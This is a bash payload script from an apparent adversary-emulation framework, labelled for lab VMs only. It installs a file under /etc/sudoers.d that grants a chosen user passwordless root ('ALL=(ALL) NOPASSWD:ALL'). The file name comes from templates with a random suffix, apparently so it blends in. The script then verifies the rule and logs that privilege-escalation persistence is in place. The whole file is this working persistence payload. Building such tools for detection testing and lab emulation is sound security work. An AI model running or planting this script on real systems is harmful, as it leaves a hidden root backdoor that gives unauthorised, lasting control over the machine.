#!/usr/bin/env bash
#
# payloads/priv_esc/sudoers_mod/commands.sh
#
# Creates a sudoers.d policy file to simulate privilege-escalation persistence.
#
# Intended only for local lab/VM environments under your control.

set -Eeuo pipefail

if [[ "${SUDOERS_MOD_DEBUG:-false}" == "true" ]]; then
    set -x
fi

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/random_utils.sh"
source "$FRAMEWORK_ROOT/lib/template_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"

shell_quote() {
    printf "%q" "$1"
}

run_priv_checked() {
    local cmd="$1"
    log "run_priv: $cmd"
    run_priv "$cmd"
}

TMP_SUDOERS=""
cleanup() {
    if [[ -n "${TMP_SUDOERS:-}" && -f "$TMP_SUDOERS" ]]; then
        rm -f "$TMP_SUDOERS"
    fi
}
trap cleanup EXIT

log "sudoers_mod starting"
log "Execution user: $(whoami)"
log "Execution id: $(id)"
log "Incoming TARGET_USER: ${TARGET_USER:-unset}"
log "Incoming USERNAME: ${USERNAME:-unset}"

TARGET_USER_MODE="${TARGET_USER_MODE:-external_or_template}"

# Prefer the explicit chain-provided TARGET_USER. Fall back to USERNAME only if set.
# Do not silently fall back to analyst unless ALLOW_ANALYST_FALLBACK=true.
if [[ -n "${TARGET_USER:-}" ]]; then
    TARGET_USER="$TARGET_USER"
elif [[ -n "${USERNAME:-}" ]]; then
    TARGET_USER="$USERNAME"
elif [[ "${ALLOW_ANALYST_FALLBACK:-false}" == "true" ]]; then
    TARGET_USER="analyst"
else
    case "$TARGET_USER_MODE" in
        external_or_template)
            TARGET_USER="$(pick_username)"
            ;;
        *)
            fail "Unsupported TARGET_USER_MODE: $TARGET_USER_MODE"
            ;;
    esac
fi

TARGET_USER="$(sanitize_identifier "$TARGET_USER")"

log "Resolved target user: $TARGET_USER"

if [[ -z "$TARGET_USER" ]]; then
    fail "Resolved TARGET_USER is empty"
fi

if ! id "$TARGET_USER" >/dev/null 2>&1; then
    fail "Target user does not exist: $TARGET_USER"
fi

# Prove up front whether privileged commands can run. This should fail loudly
# instead of allowing the delivery wrapper to report a false success.
require_privilege
run_priv_checked "id"

SUDOERS_DIR="${SUDOERS_DIR:-/etc/sudoers.d}"

FILE_TEMPLATE="$(pick_template filenames)"
SUDOERS_FILE_PREFIX="${SUDOERS_FILE_PREFIX:-}"
APPEND_RANDOM_SUFFIX_TO_FILE="${APPEND_RANDOM_SUFFIX_TO_FILE:-true}"
RANDOM_SUFFIX_LENGTH="${RANDOM_SUFFIX_LENGTH:-6}"

if [[ "$APPEND_RANDOM_SUFFIX_TO_FILE" == "true" ]]; then
    FILE_SUFFIX="$(random_lower_string "$RANDOM_SUFFIX_LENGTH")"
    FILE_TEMPLATE="${FILE_TEMPLATE}-${FILE_SUFFIX}"
fi

FILE_TEMPLATE="$(sanitize_identifier "$FILE_TEMPLATE")"

if [[ -n "$SUDOERS_FILE_PREFIX" ]]; then
    FILE_TEMPLATE="${SUDOERS_FILE_PREFIX}${FILE_TEMPLATE}"
fi

SUDOERS_FILE="${SUDOERS_DIR}/${FILE_TEMPLATE}"

SUDOERS_RULE_MODE="${SUDOERS_RULE_MODE:-nopasswd_all}"
SUDOERS_FILE_MODE="${SUDOERS_FILE_MODE:-440}"
VALIDATE_WITH_VISUDO="${VALIDATE_WITH_VISUDO:-true}"

case "$SUDOERS_RULE_MODE" in
    nopasswd_all)
        SUDOERS_RULE="${TARGET_USER} ALL=(ALL) NOPASSWD:ALL"
        ;;
    passwd_all)
        SUDOERS_RULE="${TARGET_USER} ALL=(ALL) ALL"
        ;;
    *)
        fail "Unsupported SUDOERS_RULE_MODE: $SUDOERS_RULE_MODE"
        ;;
esac

TMP_SUDOERS="$(mktemp)"

printf '# aegis_framework_sudoers\n' > "$TMP_SUDOERS"
printf '%s\n' "$SUDOERS_RULE" >> "$TMP_SUDOERS"

if [[ "$VALIDATE_WITH_VISUDO" == "true" ]]; then
    if command -v visudo >/dev/null 2>&1; then
        log "Validating temporary sudoers file with visudo"
        visudo -c -f "$TMP_SUDOERS" >/dev/null || fail "visudo validation failed for temp file"
    else
        log "visudo not found, skipping temporary file validation"
    fi
fi

log "Installing sudoers file"
log "Target user: $TARGET_USER"
log "Sudoers file: $SUDOERS_FILE"
log "Sudoers rule mode: $SUDOERS_RULE_MODE"

q_dir="$(shell_quote "$SUDOERS_DIR")"
q_tmp="$(shell_quote "$TMP_SUDOERS")"
q_file="$(shell_quote "$SUDOERS_FILE")"
q_mode="$(shell_quote "$SUDOERS_FILE_MODE")"
q_rule="$(shell_quote "$SUDOERS_RULE")"
q_user="$(shell_quote "$TARGET_USER")"

run_priv_checked "mkdir -p $q_dir"
run_priv_checked "cp $q_tmp $q_file"
run_priv_checked "chmod $q_mode $q_file"

log "Verifying installed sudoers file"
run_priv_checked "test -f $q_file"
run_priv_checked "test \"\$(stat -c '%a' $q_file)\" = $q_mode"
run_priv_checked "grep -F -- $q_rule $q_file >/dev/null"

if [[ "$VALIDATE_WITH_VISUDO" == "true" ]] && command -v visudo >/dev/null 2>&1; then
    log "Validating full sudoers configuration with visudo"
    run_priv_checked "visudo -c >/dev/null"
fi

log "Verifying sudo policy for target user"
run_priv_checked "sudo -l -U $q_user >/dev/null"

if [[ "${RECORD_TARGET_USER:-true}" == "true" ]]; then
    record_metadata "target_user=$TARGET_USER"
fi

if [[ "${RECORD_SUDOERS_FILE:-true}" == "true" ]]; then
    record_metadata "sudoers_file=$SUDOERS_FILE"
fi

if [[ "${RECORD_SUDOERS_RULE_MODE:-true}" == "true" ]]; then
    record_metadata "sudoers_rule_mode=$SUDOERS_RULE_MODE"
fi

record_metadata "sudoers_rule=$SUDOERS_RULE"

log "Privilege-escalation persistence installed and verified"
